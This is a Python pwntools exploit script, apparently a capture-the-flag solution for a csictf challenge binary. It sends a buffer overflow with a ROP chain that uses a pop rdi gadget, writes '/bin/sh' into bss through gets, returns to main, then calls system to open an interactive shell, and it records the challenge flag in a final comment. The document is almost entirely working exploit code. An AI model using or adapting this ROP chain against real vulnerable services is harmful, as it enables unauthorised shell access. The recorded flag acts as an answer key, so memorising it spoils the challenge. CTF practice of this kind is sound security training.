from pwn import *

elf = ELF("pwn-intended-0x2")
rop = ROP(elf)
HOST = "localhost"
PORT = 9003
p = remote(HOST, PORT)
offset = 56

POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]  # it needs to clear the rdi register and for the system call
bss = 0x4040a0
log.success('pop rdi; ret @ %s' % hex(POP_RDI))
log.info("sending the first payload")
# overwriting the gets function with address of main to have another write
payload = b"A" * 56 + p64(POP_RDI) + p64(bss) + p64(elf.plt['gets']) + p64(elf.sym['main'])
p.recvline()
sleep(1)
p.sendline(payload)
p.sendline("/bin/sh\0")
log.success("done writing /bin/sh")

log.info("sending the second payload")
# calling system with "/bin/sh" argument (first in stack)
payload2 = b"A" * offset + p64(POP_RDI) + p64(bss) + p64(elf.plt['system'])
p.sendline(payload2)
p.recvuntil("Welcome to csictf! Where are you headed?\nSafe Journey!\n")
p.interactive()

# FLAG --> csictf{c4n_y0u_re4lly_telep0rt?}
